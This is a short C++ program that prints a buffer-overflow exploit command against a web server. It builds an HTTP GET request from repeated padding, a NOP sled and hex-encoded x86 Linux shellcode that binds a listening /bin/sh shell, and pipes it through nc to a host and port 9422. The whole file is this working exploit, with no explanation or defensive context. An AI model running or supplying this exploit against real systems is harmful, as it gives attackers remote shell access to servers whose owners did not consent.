#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sstream>
#include <string>
#include <iostream>

using namespace std;

int main(int argc, char *argv[]) {
  ostringstream os;
  os << "echo -e \"GET /";
  int i = 0;
  while( i < atoi(argv[2]) ){
    os << argv[1];
    i++;
  }
  int j = 0;
  while (j < atoi(argv[3])){
  	os << "\\x90";
  	j++;
  }

  os << "\\x31\\xc0\\x50\\x40\\x89\\xc3\\x50\\x40\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x66\\x68\\x37\\x39\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x40\\x89\\x44\\x24\\x04\\x43\\x43\\xb0\\x66\\xcd\\x80\\x83\\xc4\\x0c\\x52\\x52\\x43\\xb0\\x66\\xcd\\x80\\x93\\x89\\xd1\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";
  os << " HTTP\" | nc ";
  os << argv[4];
  os << " 9422";

  cout << os.str();// << endl;
}